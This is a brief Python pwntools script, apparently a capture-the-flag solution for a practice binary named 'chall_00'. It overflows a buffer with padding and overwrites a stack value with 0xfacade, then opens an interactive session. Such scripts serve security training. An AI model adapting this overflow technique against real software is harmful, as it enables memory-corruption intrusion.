#!/usr/bin/env python3

from pwn import *

binary = context.binary = ELF('./chall_00')

p = process(binary.path)


payload  = b''
payload += (0x113 - 0xc) * b'A'
payload += p32(0xfacade)

print(payload)

p.sendlineafter('Now tell me what you want what you really really want!!!!!\n',payload)
p.interactive()